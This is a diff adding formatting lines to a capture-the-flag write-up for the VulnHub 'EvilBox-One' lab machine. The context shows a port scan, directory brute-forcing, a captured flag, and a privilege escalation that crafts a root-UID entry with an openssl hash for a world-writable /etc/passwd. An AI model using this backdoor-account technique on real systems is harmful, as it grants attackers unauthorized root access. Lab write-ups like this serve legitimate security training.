@@ -16,6 +16,7 @@ image:
 ```bash
 IP : 10.10.2.51
 ```
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -38,6 +39,7 @@ PORT   STATE SERVICE VERSION
 MAC Address: 08:00:27:94:F8:26 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno}
 
 ## Web Enumeration ➡️
 
@@ -48,6 +50,7 @@ Now lets see the Directory Listing files —>
 ```bash
 feroxbuster -u http://10.0.2.51:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 2 -C 403,404 -x php,html,txt,js
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%202.png)
 
@@ -103,6 +106,7 @@ mowree@EvilBoxOne:~$ cat user.txt
 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
 mowree@EvilBoxOne:~$
 ```
+{: .nolineno}
 
 Now lets see some file permissions and looks like I got something interesting →
 
@@ -110,6 +114,7 @@ Now lets see some file permissions and looks like I got something interesting �
 mowree@EvilBoxOne:/var/backups$ ls -al /etc/passwd
 -rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
 ```
+{: .nolineno}
 
 Now I have the permission to write so lets add a user name as `shiv` and `password` as password with root privileges.
 
@@ -125,12 +130,14 @@ Flags:
 $ openssl passwd -1 -salt salt password
 $1$salt$qJH7.N4xYta3aEG/dfqo/0
 ```
+{: .nolineno}
 
 we need to add some data in order for it to be aligned with the `/etc/passwd` format. This is the final result:
 
 ```bash
 shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
 ```
+{: .nolineno}
 
 I named the user `shiv`. now lets write into the `/etc/passwd` file with nano →
 
